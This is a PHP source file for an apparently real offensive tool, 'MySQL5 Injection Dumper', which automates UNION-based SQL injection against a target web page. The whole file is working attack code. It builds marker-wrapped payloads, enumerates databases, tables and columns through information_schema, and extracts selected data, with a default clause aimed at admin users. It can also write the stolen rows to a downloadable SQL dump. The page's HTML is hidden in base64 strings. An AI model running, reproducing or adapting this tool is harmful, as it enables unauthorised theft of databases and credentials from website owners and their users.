<?php
#################################################
# MySQL5 Injection Dumper v2.37                 #
# Author: NyTr0GeN                              #
# Thanks to: 007m(idea), HrN(design), AnDrEwBoY #
#################################################

error_reporting(0);
ignore_user_abort(1);
set_time_limit(0);
ini_set('memory_limit','64M');
set_magic_quotes_runtime(0);
if(get_magic_quotes_gpc()){function strips($v){return is_array($v)?array_map('strips',$v):stripslashes($v);}$_GET=strips($_GET);$_POST=strips($_POST);}
session_start();
ob_implicit_flush(1);

class dumper {
    ## Header ##
    public function mdheader() {
        echo base64_decode('PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KPGhlYWQ+DQo8dGl0bGU+TXlTUUwgNSBJbmplY3Rpb24gRHVtcGVyIHYyLjM3PC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQo8IS0tDQpib2R5IHtiYWNrZ3JvdW5kLWNvbG9yOiNjY2M7Zm9udDoxMHB4IFZlcmRhbmE7fQ0KYSB7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Y29sb3I6IzA5Zjt9DQppbnB1dFt0eXBlPXRleHRdIHtmb250OjEwcHggVmVyZGFuYTtmb250LXdlaWdodDpib2xkZXI7aGVpZ2h0OjEycHg7fQ0KLmVkaXR1cmwge2JhY2tncm91bmQtY29sb3I6I2ZmZjtib3JkZXI6MXB4IHNvbGlkICMwOWY7d2lkdGg6OTAlO2ZvbnQtd2VpZ2h0OmJvbGRlcjt9DQouc29ydGFibGUge2JvcmRlcjoxcHggc29saWQgI2NjYztib3JkZXItYm90dG9tOm5vbmU7fQ0KLnNvcnRhYmxlIHRoIHtwYWRkaW5nOjRweCA2cHggNnB4O2JhY2tncm91bmQtY29sb3I6IzQ0NDt0ZXh0LWFsaWduOmxlZnQ7Y29sb3I6I2NjYzt9DQouc29ydGFibGUgdGQge3BhZGRpbmc6MnB4IDRweCA0cHg7YmFja2dyb3VuZC1jb2xvcjojZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNjY2M7fQ0KLnNvcnRhYmxlIC5oZWFkIHtiYWNrZ3JvdW5kOiM0NDQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxSMGxHT0RsaEJRQUlBSUFCQUxlM3QvLy8veUg1QkFFQUFBRUFMQUFBQUFBRkFBZ0FBQUlMVEdBSHVKMmYybExJMUFJQU93KSA2cHggY2VudGVyIG5vLXJlcGVhdDtjdXJzb3I6cG9pbnRlcjtwYWRkaW5nLWxlZnQ6MThweDt9DQouc29ydGFibGUgLmRlc2Mge2JhY2tncm91bmQ6IzIyMiB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LFIwbEdPRGxoQlFBREFJQUJBUC8vLy8vLy95SDVCQUVBQUFFQUxBQUFBQUFGQUFNQUFBSUZoQjBYQzFzQU93KSA2cHggY2VudGVyIG5vLXJlcGVhdDtjdXJzb3I6cG9pbnRlcjtwYWRkaW5nLWxlZnQ6MThweDt9DQouc29ydGFibGUgLmFzYyB7YmFja2dyb3VuZDojMjIyIHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsUjBsR09EbGhCUUFEQUlBQkFQLy8vLy8vL3lINUJBRUFBQUVBTEFBQUFBQUZBQU1BQUFJRlRHQUh1RjBBT3cpIDZweCAgY2VudGVyIG5vLXJlcGVhdDtjdXJzb3I6cG9pbnRlcjtwYWRkaW5nLWxlZnQ6MThweDt9DQouc29ydGFibGUgLmhlYWQ6aG92ZXIsIC5zb3J0YWJsZSAuZGVzYzpob3ZlciwgLnNvcnRhYmxlIC5hc2M6aG92ZXIge2NvbG9yOiNmZmY7fQ0KLnNvcnRhYmxlIC5ldmVuIHRkIHtiYWNrZ3JvdW5kLWNvbG9yOiNmMmYyZjI7fQ0KLnNvcnRhYmxlIC5vZGQgdGQge2JhY2tncm91bmQtY29sb3I6I2ZmZjt9DQouc29ydGFibGUgaW5wdXRbdHlwZT10ZXh0XSB7d2lkdGg6OTYlO30NCi0tPg0KPC9zdHlsZT4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gDQo8IS0tDQp2YXIgVElOWT17fTsNCmZ1bmN0aW9uIFQkKGkpe3JldHVybiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpKX0NCmZ1bmN0aW9uIFQkJChlLHApe3JldHVybiBwLmdldEVsZW1lbnRzQnlUYWdOYW1lKGUpfQ0KVElOWS50YWJsZT1mdW5jdGlvbigpew0KCWZ1bmN0aW9uIHNvcnRlcihuKXt0aGlzLm49bjt9DQoJc29ydGVyLnByb3RvdHlwZS5pbml0PWZ1bmN0aW9uKGUsZil7DQoJCXZhciB0PWdlKGUpLCBpPTA7IHRoaXMuZT1lOyB0aGlzLmw9dC5yLmxlbmd0aDsgdC5hPVtdOw0KCQl0Lmg9VCQkKCd0aGVhZCcsVCQoZSkpWzBdLnJvd3NbMF07IHQudz10LmguY2VsbHMubGVuZ3RoOw0KCQlmb3IoaTtpPHQudztpKyspew0KCQkJdmFyIGM9dC5oLmNlbGxzW2ldOw0KCQkJaWYoYy5jbGFzc05hbWUhPSdub3NvcnQnKXsNCgkJCQljLmNsYXNzTmFtZT0iaGVhZCI7IGMub25jbGljaz1uZXcgRnVuY3Rpb24odGhpcy5uKycud2sodGhpcy5jZWxsSW5kZXgpJykNCgkJCX0NCgkJfQ0KCQlmb3IoaT0wO2k8dGhpcy5sO2krKyl7dC5hW2ldPXt9fQ0KCQl2YXIgYT1uZXcgRnVuY3Rpb24odGhpcy5uKycud2soJytmKycpJyk7IGEoKQ0KCX07DQoJc29ydGVyLnByb3RvdHlwZS53az1mdW5jdGlvbih5KXsNCgkJdmFyIHQ9Z2UodGhpcy5lKSwgeD10LmguY2VsbHNbeV0sIGk9MDsNCgkJZm9yKGk7aTx0aGlzLmw7aSsrKXsNCgkJCXQuYVtpXS5vPWk7IHZhciB2PXQucltpXS5jZWxsc1t5XTsgdC5yW2ldLnN0eWxlLmRpc3BsYXk9Jyc7DQoJCQl3aGlsZSh2Lmhhc0NoaWxkTm9kZXMoKSl7dj12LmZpcnN0Q2hpbGR9DQoJCQl0LmFbaV0udj12Lm5vZGVWYWx1ZT92Lm5vZGVWYWx1ZTonJw0KCQl9DQoJCWZvcihpPTA7aTx0Lnc7aSsrKXt2YXIgYz10LmguY2VsbHNbaV07IGlmKGMuY2xhc3NOYW1lIT0nbm9zb3J0Jyl7Yy5jbGFzc05hbWU9ImhlYWQifX0NCgkJaWYodC5wPT15KXt0LmEucmV2ZXJzZSgpOyB4LmNsYXNzTmFtZT10LmQ/ImFzYyI6ImRlc2MiOyB0LmQ9dC5kPzA6MX0NCgkJZWxzZXt0LnA9eTsgdC5hLnNvcnQoY3ApOyB0LmQ9MDsgeC5jbGFzc05hbWU9ImFzYyJ9DQoJCXZhciBuPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3Rib2R5Jyk7DQoJCWZvcihpPTA7aTx0aGlzLmw7aSsrKXsNCgkJCXZhciByPXQuclt0LmFbaV0ub10uY2xvbmVOb2RlKHRydWUpOyBuLmFwcGVuZENoaWxkKHIpOw0KCQkJci5jbGFzc05hbWU9aSUyPT0wPyJldmVuIjoib2RkIjsgdmFyIGNlbGxzPVQkJCgndGQnLHIpOw0KCQkJZm9yKHZhciB6PTA7ejx0Lnc7eisrKXtjZWxsc1t6XS5jbGFzc05hbWU9KHk9PXo/KGklMj09MD8iZXZlbiI6Im9kZCIpOicnKX0NCgkJfQ0KCQl0LnJlcGxhY2VDaGlsZChuLHQuYik7DQoJfTsNCglmdW5jdGlvbiBnZShlKXt2YXIgdD1UJChlKTsgdC5iPVQkJCgndGJvZHknLHQpWzBdOyB0LnI9dC5iLnJvd3M7IHJldHVybiB0fTsNCglmdW5jdGlvbiBjcChmLGMpew0KCQl2YXIgZyxoOyBmPWc9Zi52LnRvTG93ZXJDYXNlKCksIGM9aD1jLnYudG9Mb3dlckNhc2UoKTsNCgkJdmFyIGk9cGFyc2VGbG9hdChmLnJlcGxhY2UoLyhcJHxcLCkvZywnJykpLCBuPXBhcnNlRmxvYXQoYy5yZXBsYWNlKC8oXCR8XCwpL2csJycpKTsNCgkJaWYoIWlzTmFOKGkpJiYhaXNOYU4obikpe2c9aSxoPW59DQoJCWk9RGF0ZS5wYXJzZShmKTsgbj1EYXRlLnBhcnNlKGMpOw0KCQlpZighaXNOYU4oaSkmJiFpc05hTihuKSl7Zz1pOyBoPW59DQoJCXJldHVybiBnPmg/MTooZzxoPy0xOjApDQoJfTsNCglyZXR1cm57c29ydGVyOnNvcnRlcn0NCn0oKTsNCg0KZnVuY3Rpb24gY2hlY2tBbGwoY2hlY2spIHsNCgl2YXIgYWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImlucHV0Iik7DQoJZm9yKHZhciBpID0gMDsgaSA8IGFsbC5sZW5ndGg7IGkrKykgew0KCQlpZihhbGxbaV0ubmFtZSA9PSAiY29sdW1uW10iKSB7DQoJCQlhbGxbaV0uY2hlY2tlZCA9IGNoZWNrOw0KCQl9DQoJfQ0KfQ0KLy8tLT4NCjwvc2NyaXB0Pg0KPC9oZWFkPg0KPGJvZHk+DQo8ZGl2IGFsaWduPSJjZW50ZXIiPg0KPGRpdiBjbGFzcz0iZWRpdHVybCI+PHAgc3R5bGU9ImZvbnQtc2l6ZToyNHB4OyI+TXlTUUwgNSBJbmplY3Rpb24gRHVtcGVyIHYyLjM3PC9wPjwvZGl2Pg0KPGJyIC8+DQo8ZGl2IGNsYXNzPSJlZGl0dXJsIj4=');
    }

    ## Footer ##
    public function mdfooter() {
        echo base64_decode('DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+dmFyIHNvcnRlciA9IG5ldyBUSU5ZLnRhYmxlLnNvcnRlcigic29ydGVyIik7IHNvcnRlci5pbml0KCJzb3J0ZXIiLCAwKTs8L3NjcmlwdD48L2Rpdj4NCjxiciAvPg0KPGRpdiBjbGFzcz0iZWRpdHVybCI+PHA+VmlzaXQgPGEgaHJlZj0iaHR0cDovL3d3dy5pbnNlY3VyaXR5LXJvLm9yZy8iPmluU2VjdXJpdHktcm8ub3JnPC9hPjwvcD48L2Rpdj4NCjwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPg==');
    }

    ## Constructor ##
    public function __construct() {
        $this->start();
        if(empty($this->url)) $this->mkup();
        $this->mkinfos();
        if(empty($this->db) && empty($this->table) && empty($this->column)) $this->mkdbs();
        if(!empty($this->db) && empty($this->table) && empty($this->column)) $this->mktables();
        if(!empty($this->db) && !empty($this->table) && empty($this->column)) $this->mkcolumns();
        if(!empty($this->db) && !empty($this->table) && !empty($this->column)) $this->tofile?$this->mkdataf():$this->mkdata();
        $this->end();
    }

    ## Get Page ##
    private function getPage($url, $i=1) {
        if(function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $response = curl_exec($ch);
            curl_close($ch);
        } else {
            $content = file_get_contents($url);
            $headers = implode("\r\n", $http_response_header);
            $response = $headers."\r\n\r\n".$content;
        }
        return !empty($response)?$response:($i<3?$this->getPage($url,$i+1):false);
    }

    ## Hex ##
    private function hex($text) {
        $ord = '0x'; for($i = 0; $i < strlen($text); $i++) $ord .= dechex(ord($text{$i}));
        return $ord;
    }

    ## Start Line ##
    private function start() {
        $dbs     = 'dbs';
        $tables  = !empty($_GET['db'])?$_GET['db'].'tables':'';
        $columns = !empty($_GET['db'])&&!empty($_GET['table'])?$_GET['db'].$_GET['table'].'columns':'';

        $this->url     = !empty($_SESSION['url'])?$_SESSION['url']:'';
        $this->pattern = !empty($_SESSION['pattern'])?$_SESSION['pattern']:'';
        $this->host    = !empty($_SESSION['host'])?$_SESSION['host']:'';
        $this->infos   = !empty($_SESSION['infos'])?explode("\n",$_SESSION['infos']):array();
        $this->dbs     = !empty($_SESSION[$dbs])?explode("\n",$_SESSION[$dbs]):array();
        $this->tables  = !empty($_SESSION[$tables])?explode("\n",$_SESSION[$tables]):array();
        $this->columns = !empty($_SESSION[$columns])?explode("\n",$_SESSION[$columns]):array();

        $this->db      = !empty($_GET['db'])?$_GET['db']:'';
        $this->table   = !empty($_GET['table'])?$_GET['table']:'';
        $this->column  = !empty($_POST['column'])?$_POST['column']:'';
        $this->tofile  = !empty($_POST['tofile']);

        if($this->tofile) ob_start();
        $this->mdheader();
        echo '<p>Make a <a href="?unset=1">NEW</a> dumping</p>';
        if(!empty($_GET['unset'])) $this->end(0);
    }

    ## URL Parser and Pattern Maker ##
    private function mkup() {
        $url = $_POST['url']; $end = $_POST['end'];
        $this->ur1 = $url.$end;
        $urlq = parse_url($url, PHP_URL_QUERY);
        if(strpos($urlq, '[t]') !== false) {
            $word = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 6);

            ## URL Parser ##
            $key = $this->hex(chr(rand(97,122)));
            $syntax = 'aes_decrypt(aes_encrypt(concat('.$this->hex($word.':::').',%1$s,'.$this->hex(':::'.$word).'),'.$key.'),'.$key.')';
            $urlq = str_replace('[t]', $syntax, $urlq).'%2$s'.$end;
            $this->url = str_replace(parse_url($url, PHP_URL_QUERY), $urlq, $url);

            ## Pattern Maker ##
            $page = $this->getPage(sprintf($this->url, $this->hex($word), ''));
            $pattern = '/'.$word.':::(.+?):::'.$word.'/';
            preg_match($pattern, $page, $result);
            if($result[1] == $word) {
                $this->pattern = $pattern;
            } else {
                $this->end(2);
            }
        } else {
            $this->end(1);
        }
    }

    ## Informations ##
    private function mkinfos() {
        if(empty($this->infos)) {
            $page = explode(':::', $this->getPage(sprintf($this->url, 'user(),0x3a3a3a,version(),0x3a3a3a,database()', '')));

            ## host ##
            list(, $host) = explode('@', $page[1]);
            if(in_array($host, array('localhost','127.0.0.1'))) $host = parse_url($this->url, PHP_URL_HOST);
            $this->host = gethostbyname($host);

            ## url ##
            $this->infos[0] = $this->ur1;

            ## powered ##
            preg_match("/X-Powered-By: (.+?)\n/", $page[0], $pb);
            $this->infos[1] = $pb[1];

            ## server ##
            preg_match("/Server: (.+?)\n/", $page[0], $server);
            $this->infos[2] = $server[1];

            ## user() ##
            $this->infos[3] = $page[1];

            ## version() ##
            $version = $page[2];
            if((int)$version{0} < 5) $this->end(3);
            $this->infos[4] = $version;

            ## database() ##
            $this->infos[5] = $page[3];

            $this->infos = array_map('htmlentities', array_map('trim', $this->infos));
        }
        echo '<table class="sortable" border="0" cellpadding="0" cellspacing="0" width="30%" style="margin:0px 20px 20px 20px;">'.
        '<thead><tr><th width="30%">Statistic</th><th width="70%">Value</th></tr></thead><tbody>'.
        '<tr class="even"><td>Host</td><td><input type="text" value="'.$this->host.'" /></td></tr>'.
        (!empty($this->db)?'<tr class="odd"><td>Database</td><td><input type="text" value="'.$this->db.'" /></td></tr>':'').
        (!empty($this->table)?'<tr class="even"><td>Table</td><td><input type="text" value="'.$this->table.'" /></td></tr>':'').
        (!empty($this->column)?'<tr class="odd"><td>Columns</td><td><input type="text" value="'.implode(', ',$this->column).'" /></td></tr>':'').
        '</tbody></table>';

        $names = array('URL', 'Powered', 'Server',  'user()','version()', 'database()');
        echo '<table class="sortable" border="0" cellpadding="0" cellspacing="0" width="60%" style="margin:0px 20px 0px 20px;">'.
        '<thead><tr><th width="15%">Statistic</th><th width="35%">Value</th>'.
        '<th width="15%">Statistic</th><th width="35%">Value</th></tr></thead><tbody>';
        for($i = 0, $j = 0; $j < count($this->infos); $i++, $j += 2) {
            echo '<tr class="'.($i%2==0?'even':'odd').'">'.
            '<td>'.$names[$j].'</td><td><input type="text" value="'.$this->infos[$j].'" /></td>'.
            '<td>'.$names[$j+1].'</td><td><input type="text" value="'.$this->infos[$j+1].'" /></td>'.
            '</tr>';
        }
        echo '</tbody></table>';
    }

    ## Databases Dumper ##
    private function mkdbs() {
        echo '<table class="sortable" id="sorter" cellpadding="0" cellspacing="0" width="30%" style="margin:20px 20px 0px 20px;">'.
        '<thead><tr><th>Databases</th></tr></thead><tbody>';
        if(empty($this->dbs)) {
            for($i = 0; 31337; $i++) {
                $page = $this->getPage(sprintf($this->url, 'schema_name', '+from+information_schema.schemata+limit+'.$i.',1'));
                if(!preg_match($this->pattern, $page, $db)) break;
                $this->dbs[$i] = htmlentities($db[1]);
                echo '<tr class="'.($i%2==0?'even':'odd').'"><td><a href="?db='.$this->dbs[$i].'">'.$this->dbs[$i].'</a></td></tr>';
            }
        } else {
            for($i = 0; $i < count($this->dbs); $i++) {
                echo '<tr class="'.($i%2==0?'even':'odd').'"><td><a href="?db='.$this->dbs[$i].'">'.$this->dbs[$i].'</a></td></tr>';
            }
        }
        echo '</tbody></table><p>&nbsp;</p>';
    }

    ## Tables Dumper ##
    private function mktables() {
        if(in_array($this->db, $this->dbs)) {
            echo '<table class="sortable" id="sorter" cellpadding="0" cellspacing="0" width="30%" style="margin:20px 20px 0px 20px;">'.
            '<thead><tr><th>Tables</th></tr></thead><tbody>';
            if(empty($this->tables)) {
                for($i = 0; 31337; $i++) {
                    $page = $this->getPage(sprintf($this->url, 'table_name', '+from+information_schema.tables+where+table_schema='.$this->hex($this->db).'+limit+'.$i.',1'));
                    if(!preg_match($this->pattern, $page, $table)) break;
                    $this->tables[$i] = htmlentities($table[1]);
                    echo '<tr class="'.($i%2==0?'even':'odd').'"><td><a href="?db='.$this->db.'&table='.$this->tables[$i].'">'.$this->tables[$i].'</a></td></tr>';
                }
            } else {
                for($i = 0; $i < count($this->tables); $i++) {
                    echo '<tr class="'.($i%2==0?'even':'odd').'"><td><a href="?db='.$this->db.'&table='.$this->tables[$i].'">'.$this->tables[$i].'</a></td></tr>';
                }
            }
            echo '</tbody></table><p><a href="?">Back to Databases</a></p>';
        }
    }

    ## Columns Dumper ##
    private function mkcolumns() {
        if(in_array($this->db, $this->dbs) && in_array($this->table, $this->tables)) {
            echo '<form action="?db='.$this->db.'&table='.$this->table.'" method="post">'.
            '<table class="sortable" id="sorter" cellpadding="0" cellspacing="0" width="30%" style="margin:20px 20px 0px 20px;">'.
            '<thead><tr><th>Columns</th><th class="nosort" width="20">'.
            '<input type="checkbox" onclick="checkAll(this.checked);" /></th></tr></thead><tbody>';
            if(empty($this->columns)) {
                for($i = 0; 31337; $i++) {
                    $page = $this->getPage(sprintf($this->url, 'column_name', '+from+information_schema.columns+where+table_name='.$this->hex($this->table).'+and+table_schema='.$this->hex($this->db).'+limit+'.$i.',1'));
                    if(!preg_match($this->pattern, $page, $column)) break;
                    $this->columns[$i] = htmlentities($column[1]);
                    echo '<tr class="'.($i%2==0?'even':'odd').'"><td>'.$this->columns[$i].'</td><td><input type="checkbox" name="column[]" value="'.$this->columns[$i].'" /></td></tr>';
                }
            } else {
                for($i = 0; $i < count($this->columns); $i++) {
                    echo '<tr class="'.($i%2==0?'even':'odd').'"><td>'.$this->columns[$i].'</td><td><input type="checkbox" name="column[]" value="'.$this->columns[$i].'" /></td></tr>';
                }
            }
            echo '</tbody></table>'.
            '<p>Limit X <input type="text" name="x" value="0" size="4" /><br />'.
            'Limit Y <input type="text" name="y" value="1" size="4" /><br />'.
            'Max Pages <input type="text" name="max" value="5" size="4" /><br />'.
            'Add Clause <input type="checkbox" onclick="document.getElementById(\'clause\').disabled=!this.checked;" />'.
            '<input type="text" name="clause" id="clause" disabled value="WHERE+user=0x61646d696e" /><br />'.
            'Dump data to file <input type="checkbox" name="tofile" value="1" /><br />'.
            '<input type="submit" value="Send" /></p></form>'.
            '<p><a href="?db='.$this->db.'">Back to Tables</a></p>';
        }
    }

    ## Data Dumper ##
    private function mkdata() {
        if(in_array($this->db, $this->dbs) && in_array($this->table, $this->tables)) {
            echo '<table class="sortable" id="sorter" cellpadding="0" cellspacing="0" width="95%" style="margin:20px 0px 0px 0px;"><thead><tr>';
            $_columns = $this->column; $columns = array();
            for($i = 0, $j = 0; $i < count($_columns); $i++) {
                if(in_array($_columns[$i], $this->columns)) {
                    $columns[$j] = $_columns[$i];
                    echo '<th>'.$columns[$j].'</th>';
                    $j++;
                }
            }
            echo '</tr></thead><tbody>';

            $first  = (int)$_POST['x']; $first = $first>0?$first:0;
            $hop    = (int)$_POST['y']; $hop = $hop>0?$hop:1;
            $last   = (int)$_POST['max']; $last = $last>0?$first+$last:$first+5;
            $clause = !empty($_POST['clause'])?'+'.$_POST['clause']:'';
            $column = 'concat('.implode(','.$this->hex('|||||').',', $columns).')';

            for($i = $first; $i < $last; $i++) {
                $page = $this->getPage(sprintf($this->url, $column, '+from+'.$this->db.'.'.$this->table.$clause.'+limit+'.$i.','.$hop));
                $page = str_replace(array("\n","\r"), array('\n','\r'), $page);
                if(!preg_match($this->pattern, $page, $data)) break;
                $data = explode('|||||', htmlentities($data[1]));
                foreach($data as $k => $v) $data[$k] = '<td><input type="text" value="'.$v.'" /></td>';
                echo '<tr class="'.($i%2==0?'even':'odd').'">'.implode('', $data).'</tr>';
            }
            echo '</tbody></table><p><a href="?db='.$this->db.'&table='.$this->table.'">Back to Columns</a></p>';
        }
    }

    ## Data Dumper Into File ##
    private function mkdataf() {
        ob_end_clean();
        header('Content-Type: text/plain');
        $filename = 'dump_'.parse_url($this->url, PHP_URL_HOST).'_'.time().'.sql';
        header('Content-Disposition: attachment; filename='.$filename);
        $wh = fopen($filename, 'a') or die('CHMOD 777');
        if(in_array($this->db, $this->dbs) && in_array($this->table, $this->tables)) {
            $cache = '# MySQL5 Injection Dumper v2.37 by NyTr0GeN'."\n".'# Host: '.$this->host."\n".
            '# Database: '.$this->db."\n".'# Table: '.$this->table."\n".'CREATE TABLE `'.$this->table.'` (';
            echo $cache; fwrite($wh, $cache);
            $_columns = $this->column; $columns = array();
            for($i = 0, $j = 0; $i < count($_columns); $i++) {
                if(in_array($_columns[$i], $this->columns)) {
                    $columns[$j] = $_columns[$i];
                    $cache = ($j>0?', ':'').'`'.$columns[$j].'` text NOT NULL';
                    echo $cache; fwrite($wh, $cache);
                    $j++;
                }
            }
            $cache = ') ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_bin;'."\n";
            echo $cache; fwrite($wh, $cache);

            $first  = (int)$_POST['x']; $first = $first>0?$first:0;
            $hop    = (int)$_POST['y']; $hop = $hop>0?$hop:1;
            $last   = (int)$_POST['max']; $last = $last>0?$first+$last:$first+5;
            $clause = !empty($_POST['clause'])?'+'.$_POST['clause']:'';
            $column = 'concat('.implode(','.$this->hex('|||||').',', $columns).')';

            for($i = $first; $i < $last; $i++) {
                $page = $this->getPage(sprintf($this->url, $column, '+from+'.$this->db.'.'.$this->table.$clause.'+limit+'.$i.','.$hop));
                $page = str_replace(array("\n","\r"), array('\n','\r'), $page);
                if(!preg_match($this->pattern, $page, $data)) break;
                $data = explode('|||||', mysql_real_escape_string($data[1]));
                foreach($data as $k => $v) $data[$k] = '\''.$v.'\'';
                $cache = 'INSERT INTO '.$this->table.' ('.implode(', ',$columns).') VALUES ('.implode(', ',$data).');'."\n";
                echo $cache; fwrite($wh, $cache);
            }
        }
        fclose($wh);
        exit();

    }

    ## Finish Line ##
    private function end($num = 1337) {
        $dbs     = 'dbs';
        $tables  = !empty($_GET['db'])?$_GET['db'].'tables':'';
        $columns = !empty($_GET['db'])&&!empty($_GET['table'])?$_GET['db'].$_GET['table'].'columns':'';

        $_SESSION['url']     = !empty($this->url)?$this->url:'';
        $_SESSION['pattern'] = !empty($this->pattern)?$this->pattern:'';
        $_SESSION['host']    = !empty($this->host)?$this->host:'';
        $_SESSION['infos']   = !empty($this->infos)?implode("\n",$this->infos):'';
        $_SESSION[$dbs]      = !empty($this->dbs)?implode("\n",$this->dbs):'';
        $_SESSION[$tables]   = !empty($this->tables)?implode("\n",$this->tables):'';
        $_SESSION[$columns]  = !empty($this->columns)?implode("\n",$this->columns):'';

        $errors = array('<script type="text/javascript">document.location="'.$_SERVER['PHP_SELF'].'";</script>',
        'What the fuck?! That url doesnt contains [t]...',
        'That website sucks, I cant make pattern...',
        'Bad boy, mysql version is lesser than five...');
        if($num != 1337) {echo '<p style="font-size:14px;">'.$errors[$num].'</p>'; session_unset();}
        $this->mdfooter();
        exit();
    }
}

if(empty($_SESSION['url']) && empty($_POST['url'])) {
    dumper::mdheader();
    echo '<form action="?" method="post"><p>'.
    '<input type="text" name="url" value="http://127.0.0.1/sqli.php?get=-1+union+select+[t],2,3,4,5,6" style="width:50%;" />'.
    '<input type="text" name="end" value="--" size="2" />'.
    '<br /><input type="submit" value="Start Dumping" />'.
    '</p></form>';
    dumper::mdfooter();
} else {
    new dumper();
}
?>

